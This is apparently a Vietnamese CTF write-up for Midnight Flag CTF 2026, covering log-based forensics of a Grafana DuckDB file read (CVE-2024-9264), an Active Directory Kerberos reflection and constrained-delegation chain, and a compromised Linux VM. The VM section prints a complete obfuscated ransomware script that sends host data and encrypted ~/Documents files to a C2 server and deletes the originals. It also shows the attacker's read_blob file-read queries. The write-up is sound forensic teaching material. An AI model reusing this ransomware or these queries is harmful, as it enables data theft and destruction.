---
title: "Midnight Flag CTF 2026"
date: 2026-03-16 03:00:00 +0700
categories: [CTF]
tags: [Threat Hunting, Log analysis, CVE-2024-9264, CVE-2025-33073]
image: /assets/images10/banner.png
toc: true
layout: post
---

![image](/assets/images10/7.jpg)

## Duke’s DBar

### Description

```
A serial killer doesn't just take lives — he takes identities.
In every case, investigators find the same afterimage: the victim's accounts are briefly used to access their own infrastructure, as if the killer wanted someone to watch what he did next. Then everything goes quiet again.
Last night, a Grafana monitoring instance tied to a victim's environment was exposed to the Internet for a short window. During that time, a local file was exfiltrated using a recent vulnerability.
You recovered only two artifacts from the incident window:
Provided artifacts

grafana.log
grafana.db

The attacker blended into background monitoring activity and Internet noise. Your task is to isolate the malicious actions and reconstruct the truth.
Objectives
Find:
1. The CVE identifier of the vulnerability used.
2. The full path of the exfiltrated file.
3. The attacker's source IP address.
4. The Grafana username (login) that carried out the malicious actions.
Flag format

MCTF{CVE-XXXX-XXXXX:path:ip:username}
```

### Solution

#### B1: Phân tích dấu hiệu bất thường trên Log

Quá trình rà soát tệp `grafana.log` tập trung vào các `logger=query_data` tức các hành động truy vấn dữ liệu. Hai dòng log quan trọng nhất được ghi nhận tại thời điểm diễn ra sự cố:

![image](/assets/images10/1.png)

- Xuất hiện một truy vấn lạ sử dụng tính năng Expressions: `"expression":"SELECT content FROM read_blob('/etc/passwd')"`
- Sau đó attacker thực hiện tiếp truy vấn đến tệp tin mục tiêu: `"expression":"SELECT content FROM read_blob('/var/lib/grafana/ctf/secret.csv')"`

Từ đây xác định được, dữ liệu bị rò rỉ là `secret.csv`

Nhận thấy tiếp, hàm `read_blob` là hàm đặc trưng của `DuckDB`, đây là một engine phân tích dữ liệu thường được tích hợp làm plugin xử lý biểu thức trong các phiên bản của  `Granfa`. Việc cho phép thực thi `read_blob` trực tiếp từ giao diện người dùng cho thấy một lỗ hổng nghiêm trọng trong việc kiểm soát đầu vào

Dựa trên các yếu tố vừa phân tích, tiến hành search lỗ hổng trên gg

![image](/assets/images10/2.png)

- Vuln được xác định với mã định danh: `CVE-2024-9264`
- Lỗ hổng cho phép người dùng có quyền `Viewer` trở lên thực thi các truy vấn `DuckDB` tùy ý, dẫn đến đọc tệp hệ thống hoặc thực thi `RCE` nếu các extension của DuckDB được kích hoạt

#### B2: Xác định nguồn gốc và danh tính

Tiến hành trace ngược lại các dòng log được thực thi lệnh xoay quanh việc rò rỉ dữ liệu từ Bước 1, ta thu thập được các IoCs

![image](/assets/images10/3.png)

- Địa chỉ IP nguồn: `85.215.144.254`
- Công cụ: `python-requests/2.31.0` - Dấu hiệu của việc sử dụng script tự động, không phải người dùng tương tác qua trình duyệt
- Mã người dùng: `userID=5`

#### B3: Đối chiếu cơ sở dữ liệu

Để xác định `userID=5` là ai, tiến hành phân tích tệp grafana.db bằng SQLite:

![image](/assets/images10/4.png)

=> user thực hiện malicious actions là `editor2`

`Flag: MCTF{CVE-2024-9264:/var/lib/grafana/ctf/secret.csv:85.215.144.254:editor2}`  

# POST-MORTEM ARTIFACTS SERIES

## POST-MORTEM ARTIFACTS (1/3)

### Description

```
The purge.local domain has been compromised by the Executor. 
The SOC team needs your help to analyze the logs and reconstruct the attack path. 
Your Mission: You are the lead forensic analyst. 
Analyze the provided logs to reconstruct the kill chain.    
We have spun up a dedicated SIEM instance for your investigation. The recovered logs have been ingested and normalized.

Kibana credentials: analyst:ThePurgeIsComing1337%

The first flag is splitted into 5 parts: 
part 1: CVE used for the initial compromise 
part 2: Name of the server compromised by this CVE 
part 3: Username of the user who exploited this CVE 
part 4: IPv4 address of the Executor 
part 5: Minutes and seconds of the time where the exploit was triggered (MM:SS) 
Format: MCTF{part1_part2_part3_part4_part5} 
Example: MCTF{CVE-2017-0144_SERVER-01_admin_192.168.1.10_12:34}
```

### Solution

Quá trình threat hunting đã ghi nhận được một số truy vấn DNS lạ 


![image](/assets/images10/16.png)

Tiến hành research CVE xem có cái nào liên quan không thì tại [đây](https://blog.syss.com/posts/kerberos-reflection/) có một CVE nói về vấn đề này cụ thể:

```
Lỗ hổng CVE-2025-33073 (Kerberos Relaying/Reflection over SMB). Kẻ tấn công lợi dụng điểm yếu trong cơ chế xử lý Service Principal Name (SPN) bằng cách nhúng một payload đã mã hóa vào thẳng hostname. Dấu hiệu nhận diện đặc trưng (IoC) của lỗ hổng này là các truy vấn DNS chứa chuỗi 1UWhRCA... (đây là cấu trúc CREDENTIAL_TARGET_INFORMATIONA được mã hóa).
```
Dựa trên cơ sở lý thuyết này, tiến hành đối chiếu với các Artifacts thu thập được trên Kibana, ta có thể tái tạo lại toàn bộ chuỗi khai thác và giải mã 5 phần của Flag:

`Part 1 (CVE used)`: Dựa vào signature của chuỗi truy vấn DNS độc hại ghi nhận được trong log, khớp chính xác với kỹ thuật SPN Unmarshaling của CVE-2025-33073.

`Part 2 (Compromised Server)`: Phân tích sự kiện truy vấn DNS trong log là `purge-srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA)`, bằng cách loại bỏ phần payload mã hóa phía sau, ta trích xuất được mục tiêu bị nhắm tới để Authentication Coercion và Kerberos Reflection là máy chủ `PURGE-SRV1`.

`Part 3 (Username)`: Như trong bài viết có nhắc đến, ta xác định được rằng lỗ hổng chỉ được thực thi khi attacker phải có được `initial access` vào một `user` bất kì nằm trong `domain`. Tiến hành trace ngược lại và phát hiện được 1 bản ghi xác nhận 1 phiên đăng nhập thành công đến từ `kali-victus`

![image](/assets/images10/17.png)


`Part 4 (Executor IP)`: Kiểm tra log DNS để xem bản ghi độc hại trên phân giải về địa chỉ nào, hoặc đối chiếu với Event ID 4624 trên máy purge-srv1 tại thời điểm xảy ra truy vấn để tìm Source IP (như hình trên). Địa chỉ IP của kẻ tấn công được ghi nhận là `198.51.100.2`

`Part 5 (Time)`: Dựa vào trường @timestampcủa log ghi nhận sự kiện khai thác kích hoạt (như trong Kibana: Jan 19, 2026 @ 22:38:24.073), ta lấy được chính xác phút và giây là 38:24.

`Flag: MCTF{CVE-2025-33073_PURGE-SRV1_shardesty_198.51.100.2_38:24}`
## POST-MORTEM ARTIFACTS (2/3)

### Description

```
The Executor has moved laterally to another server by abusing a feature of Active Directory. 
Your task is to identify the mechanism used and the details of the compromise.

The second flag is splitted into 3 parts: 
part 1: Name of the AD feature abused for lateral movement 
part 2: Name of the server compromised using this feature 
part 3: Minutes and seconds of the start of the attack, before the feature was abused (MM:SS) 
Format: MCTF{part1_part2_part3} 
Example: MCTF{some-feature_SERVER-01_25:47} 
```
### Solution

#### part 1: Name of the AD feature abused for lateral movement 

Nhận thấy được sau khi chiếm được quyền `NT AUTHORITY\SYSTEM` trên `purge-srv1`, attacker dư sức để dump được NTLM Hash hoặc AES Key của chính tài khoản máy tính này. Chúng dùng key đó để chứng thực với Domain Controller và lấy về TGT hợp lệ

![image](/assets/images10/18.png)

Tiếp theo attacker dùng TGT vừa lấy được yêu cầu một Service Ticket để truy cập vào chính nó
`Service Name: PURGE-SRV1$`

![image](/assets/images10/19.png)

- Đây có thể là bước `S4U2self`. Phần mở rộng này cho phép một dịch vụ như `PURGE-SRV1$` xin vé đại diện cho một user bất kỳ trong Domain (thường là Domain Admin hoặc user có quyền cao trên máy mục tiêu tiếp theo) mà không cần mật khẩu của user đó
- DC chấp thuận cấp vé với `Failure Code: 0x0` có nghĩa là quá trình chuyển đổi giao thức  đã thành công. Attacker giờ đã có một vé mạo danh một user đặc quyền, nhưng vé này hiện tại chỉ có tác dụng trên chính `PURGE-SRV1`

Tiếp nữa, attacker gửi yêu cầu thứ 3. Lần này, mục tiêu truy cập Service Name đã thay đổi thành `PURGE-SRV2$`

![image](/assets/images10/20.png)


- Đây là bước `S4U2proxy`. Kẻ tấn công trình cái vé mạo danh (vừa lấy được ở bước S4U2self) cho Domain Controller nhằm yêu cầu cho phép user này truy cập vào `PURGE-SRV2` thông qua sự ủy quyền của `PURGE-SRV1`
    - Việc trường `Transited Services` được ghi nhận chứng tỏ DC đã truy vết chuỗi ủy quyền này.
    - Do DC trả về Failure Code: 0x0 , điều này xác nhận rằng `PURGE-SRV1$` đã được cấu hình Delegation tới `PURGE-SRV2$`

=> Sau một hồi research thì biết được attacker đã lợi dụng một lỗi cấu hình trong `AD feature` nhằm `lateral movement` mà không thông qua bước xác thực người dùng. Bài viết tại đây [Attacking Kerberos Constrained Delegation](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13)

=> part 1: `constrained-delegation`

#### part 2: Name of the server compromised using this feature

`PURGE-SRV2`

#### part 3: Minutes and seconds of the start of the attack, before the feature was abused (MM:SS)

Tiến hành trace ngược lại các log ở phía trước thì thấy được các lần login thành công 

Câu này mình sẽ tìm thời điểm mà attacker leo quyền thành công của chính tài khoản máy tính Domain Controller (PURGE-DC$) vào máy chủ purge-srv1 (thông qua Event ID 4624)

![image](/assets/images10/21.png)

Cụ thể, tại mốc thời gian `22:43:11`, hệ thống ghi nhận một sự kiện đăng nhập mạng (Logon Type 3) bất thường:

- Account Name: PURGE-DC$
- Source Network Address: 127.0.0.1 (IP Loopback)
- Logon GUID: {85f141af-027f-cb6e-3218-5b76702672bf}

Dấu vết `127.0.0.1` khẳng định kẻ tấn công đang thực hiện Relay xác thực ngay trên máy chủ đã chiếm quyền (PURGE-SRV1). Bằng cách ép DC xác thực ngược lại mình, attacker đã chuyển tiếp (relay) phiên đăng nhập đó vào dịch vụ LDAP của Domain Controller để bí mật ghi đè thuộc tính `msDS-AllowedToActOnBehalfOfOtherIdentity` của máy chủ mục tiêu. (đây chỉ là phỏng đoán vì không có log ghi lại việc ghi đè thuộc tính)

=> part3: `43:11`

`Flag: MCTF{constrained-delegation_PURGE-SRV2_43:11}`

## POST-MORTEM ARTIFACTS (3/3)

### Description

![image](/assets/images10/6.jpg)

### Solution

![image](/assets/images10/21.png)

#### part 1: Name of the compromised account?

Dựa trên log Event ID `4768` ghi nhận tại thời điểm `22:51:56`, hệ thống phát hiện yêu cầu cấp vé `TGT` cho tài khoản `sloomis`. Đây là tài khoản quản trị viên đích mà kẻ thực thi nhắm tới để chiếm toàn quyền kiểm soát miền purge.local

#### part 2: Code of the authentication method used for the domain admin access?

Tại trường `Pre-Authentication Type` của log trên, mã phương thức được sử dụng là `16`

- Giải thích: Mã 16 đại diện cho giao thức PKINIT (Kerberos Public Key Cryptography for Initial Authentication). Thay vì sử dụng mật khẩu NTLM truyền thống, kẻ tấn công đã sử dụng một cặp khóa (Public/Private Key) hoặc Chứng chỉ số để xác thực với Domain Controller.

#### part 3: Minutes and seconds(MM:SS) of the exactly moment that access was established?

`51:56`

`Flag: MCTF{sloomis_16_51:56}`

## Gh0st_1n_7h3_G1t

### Description

### Solution

Bài cung cấp cho 1 máy ảo file `.ova`, mở bằng `Virtualbox` rồi tiến hành phân tích

Thử thách yêu cầu điều tra một hệ thống Linux bị xâm nhập qua 2 file gồm file chứa hdh Ubuntu `.ova` và file pcap chứa data bị đánh cắp

Quá trình bắt đầu bằng file `note.txt` chứa kết quả quét từ công cụ Nikto, thấy được hệ thống đang để lộ thư mục quản lý phiên bản `.git` công khai 
![image](/assets/images10/10.png)

Dựa trên thông tin từ Nikto, tiến hành kiểm tra thư mục dự án bug-git. Thấy được sự hiện diện của: app.py, static/, và templates/ xác nhận đây là ứng dụng web chạy trên nền tảng Flask. Thực hiện kiểm tra vào cấu hình nội bộ tại `.git/config`. Phát hiện được một cơ chế Persistence thông qua tùy chọn `fsmonitor`

![image](/assets/images10/9.png)

Mã độc lợi dụng tính năng theo dõi tệp tin của Git để thực thi mã độc với quyền cao. Chuỗi ký tự cuối cùng là định dạng Base64 giải mã ta nhận được Part 1 của flag

`part 1: Th1S_Is_Y0uR_f7rst_P@rt`

Tiếp theo ta có nhận được 1 thông báo lỗi hệ thống xuất hiện trên màn hình người dùng. Thông báo chỉ ra một sự cố nghiêm trọng trong quá trình xử lý gói tin của hệ thống

![image](/assets/images10/11.png)

Lỗi này xác nhận sự tồn tại của tệp `usercustomize.py`. Trong python, đây là một module đặc biệt được trình thông dịch tự động tìm kiếm và thực thi đầu tiên mỗi khi khởi động. Xác định vị trí file thấy xuất hiện trong `/usr/lib/python3.12/`, cho thấy mã độc đã chiếm được quyền `Root` để ghi đè lên các tệp cấu hình của hệ thống

![image](/assets/images10/12.png)

Nội dung tệp `usercustomize.py` tiết lộ một kịch bản tấn công Ransomware sử dụng thuật toán `ChaCha20` để encrypt dữ liệu

```python
import os
import ssl
import json
import socket
import struct
import hashlib
import urllib.request
import base64


_0xfb8c4d = __import__(base64.b64decode(b"cGxhdGZvcm0=").decode())
_0x3e9a7f = __import__(base64.b64decode(b"Z2V0cGFzcw==").decode())

_0x4a2b8f = base64.b64decode(b"MTkyLjE2OC4xLjY0").decode()

_0x7d3c9a = ssl.create_default_context()
_0x7d3c9a.check_hostname = False
_0x7d3c9a.verify_mode    = ssl.CERT_NONE

def _0x9f4e2a(v, n):
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def _0x6b1d7c(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 16)
    c = (c + d) & 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 12)
    a = (a + b) & 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 8)
    c = (c + d) & 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 7)
    return a, b, c, d

def _0x3c8f5b(key: bytes, counter: int, nonce: bytes) -> bytes:
    _0x1a4e9f = base64.b64decode(b"ZXhwYW5kIDMyLWJ5dGUgaw==")
    state = list(struct.unpack(base64.b64decode(b"PDE2SQ==").decode(),
        _0x1a4e9f +
        key[:32] +
        struct.pack(base64.b64decode(b"PEk=").decode(), counter & 0xFFFFFFFF) +
        nonce[:12]
    ))

    working = state[:]
    for _ in range(10):
        working[0],  working[4],  working[8],  working[12] = _0x6b1d7c(working[0],  working[4],  working[8],  working[12])
        working[1],  working[5],  working[9],  working[13] = _0x6b1d7c(working[1],  working[5],  working[9],  working[13])
        working[2],  working[6],  working[10], working[14] = _0x6b1d7c(working[2],  working[6],  working[10], working[14])
        working[3],  working[7],  working[11], working[15] = _0x6b1d7c(working[3],  working[7],  working[11], working[15])
        working[0],  working[5],  working[10], working[15] = _0x6b1d7c(working[0],  working[5],  working[10], working[15])
        working[1],  working[6],  working[11], working[12] = _0x6b1d7c(working[1],  working[6],  working[11], working[12])
        working[2],  working[7],  working[8],  working[13] = _0x6b1d7c(working[2],  working[7],  working[8],  working[13])
        working[3],  working[4],  working[9],  working[14] = _0x6b1d7c(working[3],  working[4],  working[9],  working[14])

    output = [(working[i] + state[i]) & 0xFFFFFFFF for i in range(16)]
    return struct.pack(base64.b64decode(b"PDE2SQ==").decode(), *output)

def _0x8e2a6d(plaintext: bytes, key: bytes, nonce: bytes, counter: int = 0) -> bytes:
    ciphertext = bytearray()
    for i in range(0, len(plaintext), 64):
        block    = _0x3c8f5b(key, counter + i // 64, nonce)
        chunk    = plaintext[i:i + 64]
        ciphertext += bytes(a ^ b for a, b in zip(chunk, block))
    return bytes(ciphertext)


_0x2f7b4a = getattr(_0xfb8c4d, base64.b64decode(b"bm9kZQ==").decode())()
_0x9c3e1d = getattr(_0xfb8c4d, base64.b64decode(b"cmVsZWFzZQ==").decode())()
_0x5a6f8b = getattr(_0x3e9a7f, base64.b64decode(b"Z2V0dXNlcg==").decode())()

try:
    with open(base64.b64decode(b"L2V0Yy9tYWNoaW5lLWlk").decode(), base64.b64decode(b"cg==").decode()) as f:
        _0x4d8c2e = f.read().strip()
except FileNotFoundError:
    _0x4d8c2e = base64.b64decode(b"dW5rbm93bg==").decode()


def _0x7f9d3a():
    _0x1f45e0 = {
        base64.b64decode(b"aG9zdG5hbWU=").decode(): _0x2f7b4a,
        base64.b64decode(b"a2VybmVs").decode():   _0x9c3e1d,
        base64.b64decode(b"dXNlcm5hbWU=").decode(): _0x5a6f8b,
        base64.b64decode(b"bWFjaGluZV9pZA==").decode(): _0x4d8c2e,
    }

    _0x6e4a2f = base64.b64decode(b"aHR0cHM6Ly8=").decode() + _0x4a2b8f + base64.b64decode(b"Ojg0NDM=").decode()

    body = json.dumps(_0x1f45e0).encode()
    req  = urllib.request.Request(
        _0x6e4a2f + base64.b64decode(b"L2pzb24=").decode(),
        data=body,
        headers={base64.b64decode(b"Q29udGVudC1UeXBl").decode(): base64.b64decode(b"YXBwbGljYXRpb24vanNvbg==").decode()},
        method=base64.b64decode(b"UE9TVA==").decode(),
    )
    with urllib.request.urlopen(req, context=_0x7d3c9a) as resp:
        resp.read()


def _0x1b5e9c() -> tuple[bytes, bytes]:
    seed   = f"{_0x2f7b4a}:{_0x9c3e1d}:{_0x4d8c2e}:{_0x5a6f8b}"
    digest = hashlib.sha512(seed.encode()).digest()
    key    = digest[:32]
    nonce  = digest[32:44]
    return key, nonce


def _0x3a7f2d(filename: str, data: bytes):
    _0x9b4e6c = 9000

    name_bytes = filename.encode(base64.b64decode(b"dXRmLTg=").decode())
    with socket.create_connection((_0x4a2b8f, _0x9b4e6c)) as sock:
        sock.sendall(struct.pack(base64.b64decode(b"Pkk=").decode(), len(name_bytes)))
        sock.sendall(name_bytes)
        sock.sendall(struct.pack(base64.b64decode(b"Pkk=").decode(), len(data)))
        sock.sendall(data)
        sock.recv(3)


_0x8c1d4f   = os.path.join(os.path.expanduser(base64.b64decode(b"fg==").decode()), base64.b64decode(b"RG9jdW1lbnRz").decode())
key, nonce = _0x1b5e9c()

_0x7f9d3a()

for fname in os.listdir(_0x8c1d4f):
    fpath = os.path.join(_0x8c1d4f, fname)
    if not os.path.isfile(fpath):
        continue

    with open(fpath, base64.b64decode(b"cmI=").decode()) as f:
        plaintext = f.read()

    ciphertext = _0x8e2a6d(plaintext, key, nonce)
    _0x3a7f2d(fname + base64.b64decode(b"LmhlbGxjYXQ=").decode(), ciphertext)
    os.remove(fpath)

```

- Seed đầu vào: Kết hợp các thông tin hostname, kernel version, machine-id và username.

- Tạo khóa: Sử dụng hàm băm SHA-512 từ chuỗi Seed trên để lấy 32 byte đầu làm Key và 12 byte tiếp theo làm Nonce.

- Quét mục tiêu: Tìm kiếm tất cả tệp tin trong thư mục ~/Documents.

- Mã hóa: Thực hiện mã hóa nội dung tệp bằng khóa đã tạo.

- Gửi thông tin định danh máy về máy chủ kẻ tấn công (C2 Server) tại IP 192.168.1.64 qua cổng 8443 dưới dạng JSON và truyền tải tệp tin đã mã hóa có đuôi `.hellcat` về cổng 9000 của máy chủ này

- Sử dụng lệnh os.remove(fpath) để xóa sạch tệp tin gốc trên máy nạn nhân, khiến việc khôi phục bằng các công cụ phục hồi ổ đĩa trở nên khó khăn

Vì ta đang phân tích trực tiếp trên máy mục tiêu nên có thể lấy được thông tin tạo Seed trực tiếp từ đây 

![image](/assets/images10/13.png)

Tiếp theo tiến hành trích xuất tệp tin bị mã hóa và gửi đi qua pcap, filter theo `tcp.port == 9000` và

![image](/assets/images10/14.png)

Cuối cùng, thực hiện thuật toán ChaCha20 bằng script Python với các thông số đã trích xuất. Vì đây là thuật toán mã hóa dòng Stream Cipher, việc áp dụng cùng một luồng khóa Keystream vào Ciphertext sẽ khôi phục được file PDF ban đầu

```python
import hashlib
import struct
import os

HOSTNAME   = "midnight"
KERNEL     = "6.17.0-14-generic"
MACHINE_ID = "6ea3ad95b0cb495d86291db1c798247f"
USERNAME   = "john"

def rotate_left(v, n):
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def quarter_round(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF; d ^= a; d = rotate_left(d, 16)
    c = (c + d) & 0xFFFFFFFF; b ^= c; b = rotate_left(b, 12)
    a = (a + b) & 0xFFFFFFFF; d ^= a; d = rotate_left(d, 8)
    c = (c + d) & 0xFFFFFFFF; b ^= c; b = rotate_left(b, 7)
    return a, b, c, d

def chacha20_block(key, counter, nonce):
    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
    state = constants + list(struct.unpack("<8I", key)) + [counter & 0xFFFFFFFF] + list(struct.unpack("<3I", nonce))
    working = state[:]
    for _ in range(10):
        working[0], working[4], working[8],  working[12] = quarter_round(working[0], working[4], working[8],  working[12])
        working[1], working[5], working[9],  working[13] = quarter_round(working[1], working[5], working[9],  working[13])
        working[2], working[6], working[10], working[14] = quarter_round(working[2], working[6], working[10], working[14])
        working[3], working[7], working[11], working[15] = quarter_round(working[3], working[7], working[11], working[15])
        working[0], working[5], working[10], working[15] = quarter_round(working[0], working[5], working[10], working[15])
        working[1], working[6], working[11], working[12] = quarter_round(working[1], working[6], working[11], working[12])
        working[2], working[7], working[8],  working[13] = quarter_round(working[2], working[7], working[8],  working[13])
        working[3], working[4], working[9],  working[14] = quarter_round(working[3], working[4], working[9],  working[14])
    return struct.pack("<16I", *[(working[i] + state[i]) & 0xFFFFFFFF for i in range(16)])

def decrypt_chacha20(ciphertext, key, nonce):
    plaintext = bytearray()
    for i in range(0, len(ciphertext), 64):
        block = chacha20_block(key, i // 64, nonce)
        chunk = ciphertext[i:i + 64]
        plaintext += bytes(a ^ b for a, b in zip(chunk, block))
    return bytes(plaintext)

def main():
    seed = f"{HOSTNAME}:{KERNEL}:{MACHINE_ID}:{USERNAME}"
    digest = hashlib.sha512(seed.encode()).digest()
    key = digest[:32]
    nonce = digest[32:44]

    if not os.path.exists("ok"):
        print("File not found.")
        return

    with open("ok", "rb") as f:
        data = f.read()

    # Try every offset in the first 256 bytes to find %PDF header
    found = False
    for offset in range(min(256, len(data))):
        test_decrypted = decrypt_chacha20(data[offset:offset+64], key, nonce)
        if b"%PDF" in test_decrypted:
            print(f"Found PDF header at offset {offset}!")
            full_decrypted = decrypt_chacha20(data[offset:], key, nonce)
            with open("recovered.pdf", "wb") as f:
                f.write(full_decrypted)
            found = True
            break
    
    if not found:
        # Fallback: decrypt from offset 0
        print("No PDF header found. Decrypting from offset 0...")
        full_decrypted = decrypt_chacha20(data, key, nonce)
        with open("recovered.pdf", "wb") as f:
            f.write(full_decrypted)

if __name__ == "__main__":
    main()
```

![image](/assets/images10/15.png)

`Flag: MCTF{Th1S_Is_YðuR_f7rst_P@rt0x_F1n@l_P4rt$}`